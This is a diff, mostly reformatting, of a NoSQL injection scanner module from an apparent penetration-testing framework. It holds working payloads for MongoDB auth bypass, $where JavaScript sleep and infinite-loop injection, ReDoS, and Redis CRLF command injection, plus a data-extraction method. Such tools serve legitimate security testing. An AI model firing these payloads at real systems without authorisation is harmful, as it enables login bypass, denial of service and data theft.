@@ -5,62 +5,59 @@ ATOMIC FRAMEWORK - NoSQL Injection Module
 NoSQL Injection detection and exploitation
 """
 
-import re
-import json
-
-
 from config import Payloads, Colors
 
 
 class NoSQLModule:
     """NoSQL Injection Testing Module"""
-    
+
     def __init__(self, engine):
         self.engine = engine
         self.requester = engine.requester
         self.name = "NoSQL Injection"
-        
+
         # NoSQL indicators
         self.nosql_indicators = [
-            '$ne',
-            '$gt',
-            '$lt',
-            '$regex',
-            '$exists',
-            '$where',
-            'mongodb',
-            'bson',
-            '_id',
-            'ObjectId',
-            'MongoError',
+            "$ne",
+            "$gt",
+            "$lt",
+            "$regex",
+            "$exists",
+            "$where",
+            "mongodb",
+            "bson",
+            "_id",
+            "ObjectId",
+            "MongoError",
         ]
-    
+
     def test(self, url: str, method: str, param: str, value: str):
         """Test for NoSQL Injection"""
         # Test operator injection
         self._test_operators(url, method, param, value)
-        
+
         # Test JSON injection
         self._test_json_injection(url, method, param, value)
-        
+
         # Test JavaScript injection
         self._test_js_injection(url, method, param, value)
-        
+
         # Test blind timing
         self._test_blind_timing(url, method, param, value)
-        
+
         # Test aggregation pipeline injection
         self._test_aggregation_pipeline(url, method, param, value)
-        
+
         # Test Redis injection
         self._test_redis_injection(url, method, param, value)
-        
+
         # Test ReDoS via NoSQL $regex
         self._test_regex_dos(url, method, param, value)
-    
+
     def _test_blind_timing(self, url: str, method: str, param: str, value: str):
         """Test blind NoSQL injection via timing"""
         import time
+
         payloads = ['{"$where": "sleep(5000)"}', "1;sleep(5000)"]
         try:
             start = time.time()
@@ -80,9 +77,13 @@ class NoSQLModule:
                     elapsed2 = time.time() - start2
                     if elapsed2 > baseline + 4.0 and elapsed2 >= 4.5:
                         from core.engine import Finding
+
                         finding = Finding(
                             technique="NoSQL Injection (Blind / Timing-based)",
-                            url=url, severity='HIGH', confidence=0.7, param=param,
+                            url=url,
+                            severity="HIGH",
+                            confidence=0.7,
+                            param=param,
                             payload=payload,
                             evidence=f"Time delay: {elapsed:.1f}s (confirmed {elapsed2:.1f}s) vs baseline {baseline:.1f}s",
                         )
@@ -104,12 +105,16 @@ class NoSQLModule:
                 if not response:
                     continue
                 text = response.text.lower()
-                for ind in ['password', 'leaked', 'email', 'username']:
+                for ind in ["password", "leaked", "email", "username"]:
                     if ind in text:
                         from core.engine import Finding
+
                         finding = Finding(
                             technique="NoSQL Injection (Aggregation Pipeline)",
-                            url=url, severity='HIGH', confidence=0.75, param=param,
+                            url=url,
+                            severity="HIGH",
+                            confidence=0.75,
+                            param=param,
                             payload=payload,
                             evidence=f"Aggregation indicator: {ind}",
                         )
@@ -121,9 +126,9 @@ class NoSQLModule:
     def _test_redis_injection(self, url: str, method: str, param: str, value: str):
         """Test Redis command injection"""
         payloads = [
-            'test\\r\\nCONFIG SET dir /tmp\\r\\n',
-            'test\\r\\nINFO\\r\\n',
-            '\\r\\nPING\\r\\n',
+            "test\\r\\nCONFIG SET dir /tmp\\r\\n",
+            "test\\r\\nINFO\\r\\n",
+            "\\r\\nPING\\r\\n",
         ]
         for payload in payloads:
             try:
@@ -132,12 +137,16 @@ class NoSQLModule:
                 if not response:
                     continue
                 text = response.text.lower()
-                for ind in ['redis_version', '+pong', '+ok', 'connected_clients']:
+                for ind in ["redis_version", "+pong", "+ok", "connected_clients"]:
                     if ind in text:
                         from core.engine import Finding
+
                         finding = Finding(
                             technique="NoSQL Injection (Redis Command Injection)",
-                            url=url, severity='CRITICAL', confidence=0.9, param=param,
+                            url=url,
+                            severity="CRITICAL",
+                            confidence=0.9,
+                            param=param,
                             payload=payload,
                             evidence=f"Redis indicator: {ind}",
                         )
@@ -149,6 +158,7 @@ class NoSQLModule:
     def _test_regex_dos(self, url: str, method: str, param: str, value: str):
         """Test for ReDoS via NoSQL $regex operator"""
         import time
+
         # Measure baseline
         try:
             start = time.time()
@@ -156,7 +166,7 @@ class NoSQLModule:
             baseline = time.time() - start
         except Exception:
             baseline = 0
-        
+
         redos_payloads = [
             '{"$regex": "^(a+)+$", "$options": "i"}',
             '{"$regex": "(.*a){25}"}',
@@ -169,9 +179,13 @@ class NoSQLModule:
                 elapsed = time.time() - start
                 if elapsed > baseline + 3.0 and elapsed >= 3.5:
                     from core.engine import Finding
+
                     finding = Finding(
                         technique="NoSQL Injection (ReDoS via $regex)",
-                        url=url, severity='MEDIUM', confidence=0.65, param=param,
+                        url=url,
+                        severity="MEDIUM",
+                        confidence=0.65,
+                        param=param,
                         payload=payload,
                         evidence=f"ReDoS delay: {elapsed:.1f}s vs baseline {baseline:.1f}s",
                     )
@@ -182,42 +196,43 @@ class NoSQLModule:
 
     def test_url(self, url: str):
         """Test URL for NoSQL Injection"""
-        pass
-    
+
     def _test_operators(self, url: str, method: str, param: str, value: str):
         """Test NoSQL operators"""
         payloads = Payloads.NOSQL_PAYLOADS
-        
+
         # Get baseline response for comparison
         try:
             baseline_data = {param: value}
             baseline = self.requester.request(url, method, data=baseline_data)
-            baseline_len = len(baseline.text) if baseline else 0
-            baseline_text = baseline.text.lower() if baseline else ''
+            len(baseline.text) if baseline else 0
+            baseline_text = baseline.text.lower() if baseline else ""
         except Exception:
-            baseline_len = 0
-            baseline_text = ''
-        
+            baseline_text = ""
+
         for payload in payloads:
             try:
                 data = {param: payload}
                 response = self.requester.request(url, method, data=data)
-                
+
                 if not response:
                     continue
-                
+
                 response_text = response.text.lower()
-                
+
                 # Check for NoSQL error indicators (strong signal)
-                error_indicators = ['mongoerror', 'bson', 'objectid', '$where']
+                error_indicators = ["mongoerror", "bson", "objectid", "$where"]
                 error_count = sum(1 for ind in error_indicators if ind.lower() in response_text)
-                
-                if error_count >= 1 and error_count > sum(1 for ind in error_indicators if ind.lower() in baseline_text):
+
+                if error_count >= 1 and error_count > sum(
+                    1 for ind in error_indicators if ind.lower() in baseline_text
+                ):
                     from core.engine import Finding
+
                     finding = Finding(
                         technique="NoSQL Injection (Operator-based)",
                         url=url,
-                        severity='HIGH',
+                        severity="HIGH",
                         confidence=0.85,
                         param=param,
                         payload=payload,
@@ -225,20 +240,21 @@ class NoSQLModule:
                     )
                     self.engine.add_finding(finding)
                     return
-                
+
                 # Check for authentication bypass by comparing to baseline
-                auth_indicators = ['welcome', 'dashboard', 'logged in', 'profile', 'admin']
+                auth_indicators = ["welcome", "dashboard", "logged in", "profile", "admin"]
                 if payload in ['{"$ne": null}', '{"$gt": ""}']:
                     response_has_auth = any(ind in response_text for ind in auth_indicators)
                     baseline_has_auth = any(ind in baseline_text for ind in auth_indicators)
-                    
+
                     # Only flag if auth indicators appear in response but NOT in baseline
                     if response_has_auth and not baseline_has_auth:
                         from core.engine import Finding
+
                         finding = Finding(
                             technique="NoSQL Injection (Auth Bypass)",
                             url=url,
-                            severity='CRITICAL',
+                            severity="CRITICAL",
                             confidence=0.9,
                             param=param,
                             payload=payload,
@@ -246,11 +262,11 @@ class NoSQLModule:
                         )
                         self.engine.add_finding(finding)
                         return
-                        
+
             except Exception as e:
-                if self.engine.config.get('verbose'):
+                if self.engine.config.get("verbose"):
                     print(f"{Colors.error(f'NoSQL operator test error: {e}')}")
-    
+
     def _test_json_injection(self, url: str, method: str, param: str, value: str):
         """Test JSON-based NoSQL injection"""
         json_payloads = [
@@ -258,7 +274,7 @@ class NoSQLModule:
             '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
             '{"$where": "this.password.length > 0"}',
         ]
-        
+
         # Get baseline response for comparison
         try:
             baseline_data = {param: value}
@@ -269,42 +285,49 @@ class NoSQLModule:
             baseline_len = len(baseline.text)
         except Exception:
             return
-        
+
         # NoSQL-specific indicators that distinguish real injection from normal 200 responses
         nosql_success_indicators = [
-            'mongodb', 'mongoerror', 'bson', 'objectid',
-            '$ne', '$gt', '$regex', '$where', '_id',
+            "mongodb",
+            "mongoerror",
+            "bson",
+            "objectid",
+            "$ne",
+            "$gt",
+            "$regex",
+            "$where",
+            "_id",
         ]
         # Pre-lowered for efficient comparison
         nosql_success_lower = [ind.lower() for ind in nosql_success_indicators]
-        auth_bypass_indicators = ['welcome', 'dashboard', 'logged in', 'profile', 'admin']
-        
+        auth_bypass_indicators = ["welcome", "dashboard", "logged in", "profile", "admin"]
+
         for payload in json_payloads:
             try:
-                headers = {'Content-Type': 'application/json'}
+                headers = {"Content-Type": "application/json"}
                 response = self.requester.request(url, method, data=payload, headers=headers)
-                
+
                 if not response:
                     continue
-                
+
                 if response.status_code != 200:
                     continue
-                
+
                 response_text = response.text.lower()
                 response_len = len(response.text)
-                
+
                 # Check for NoSQL error indicators that are NEW (not in baseline)
                 new_nosql_indicators = sum(
-                    1 for ind in nosql_success_lower
-                    if ind in response_text and ind not in baseline_text
+                    1 for ind in nosql_success_lower if ind in response_text and ind not in baseline_text
                 )
-                
+
                 if new_nosql_indicators >= 1:
                     from core.engine import Finding
+
                     finding = Finding(
                         technique="NoSQL Injection (JSON-based)",
                         url=url,
-                        severity='HIGH',
+                        severity="HIGH",
                         confidence=0.85,
                         param=param,
                         payload=payload,
@@ -312,19 +335,20 @@ class NoSQLModule:
                     )
                     self.engine.add_finding(finding)
                     return
-                
+
                 # Check for auth bypass: response must differ significantly from
                 # baseline AND contain auth indicators that baseline does not
                 response_has_auth = any(ind in response_text for ind in auth_bypass_indicators)
                 baseline_has_auth = any(ind in baseline_text for ind in auth_bypass_indicators)
                 len_diff = abs(response_len - baseline_len)
-                
+
                 if response_has_auth and not baseline_has_auth and len_diff > 100:
                     from core.engine import Finding
+
                     finding = Finding(
                         technique="NoSQL Injection (JSON-based)",
                         url=url,
-                        severity='HIGH',
+                        severity="HIGH",
                         confidence=0.8,
                         param=param,
                         payload=payload,
@@ -332,11 +356,11 @@ class NoSQLModule:
                     )
                     self.engine.add_finding(finding)
                     return
-                        
+
             except Exception as e:
-                if self.engine.config.get('verbose'):
+                if self.engine.config.get("verbose"):
                     print(f"{Colors.error(f'NoSQL JSON test error: {e}')}")
-    
+
     def _test_js_injection(self, url: str, method: str, param: str, value: str):
         """Test JavaScript injection in NoSQL"""
         js_payloads = [
@@ -345,7 +369,7 @@ class NoSQLModule:
             "'; while(true){}; var dummy='",
             "'; sleep(5000); var dummy='",
         ]
-        
+
         # Get baseline response for comparison
         try:
             baseline_data = {param: value}
@@ -355,29 +379,30 @@ class NoSQLModule:
             baseline_len = len(baseline.text)
         except Exception:
             return
-        
+
         for payload in js_payloads:
             try:
                 data = {param: payload}
                 response = self.requester.request(url, method, data=data)
-                
+
                 if not response:
                     continue
-                
+
                 # Check for JavaScript execution by comparing response differences
                 response_len = len(response.text)
-                
+
                 # Only flag if response is significantly different from baseline
                 # AND contains indicators of successful injection
                 if response.status_code == 200 and abs(response_len - baseline_len) > 50:
                     response_text = response.text.lower()
                     # Look for auth bypass indicators or data leak
-                    if any(ind in response_text for ind in ['welcome', 'dashboard', 'logged in', 'profile', 'admin']):
+                    if any(ind in response_text for ind in ["welcome", "dashboard", "logged in", "profile", "admin"]):
                         from core.engine import Finding
+
                         finding = Finding(
                             technique="NoSQL Injection (JavaScript)",
                             url=url,
-                            severity='CRITICAL',
+                            severity="CRITICAL",
                             confidence=0.75,
                             param=param,
                             payload=payload,
@@ -385,30 +410,32 @@ class NoSQLModule:
                         )
                         self.engine.add_finding(finding)
                         return
-                    
+
             except Exception as e:
-                if self.engine.config.get('verbose'):
+                if self.engine.config.get("verbose"):
                     print(f"{Colors.error(f'NoSQL JS test error: {e}')}")
-    
-    def exploit_extract_data(self, url: str, param: str, collection: str = 'users') -> list:
+
+    def exploit_extract_data(self, url: str, param: str, collection: str = "users") -> list:
         """Attempt to extract data via NoSQL injection"""
         extraction_payloads = [
             f'{{"$where": "return this.collection == \'{collection}\'"}}',
             f'{{"collection": "{collection}"}}',
         ]
-        
+
         results = []
         for payload in extraction_payloads:
             try:
                 data = {param: payload}
-                response = self.requester.request(url, 'POST', data=data)
-                
+                response = self.requester.request(url, "POST", data=data)
+
                 if response:
-                    results.append({
-                        'payload': payload,
-                        'response': response.text,
-                    })
+                    results.append(
+                        {
+                            "payload": payload,
+                            "response": response.text,
+                        }
+                    )
             except Exception as e:
                 print(f"{Colors.error(f'NoSQL extraction error: {e}')}")
-        
+
         return results
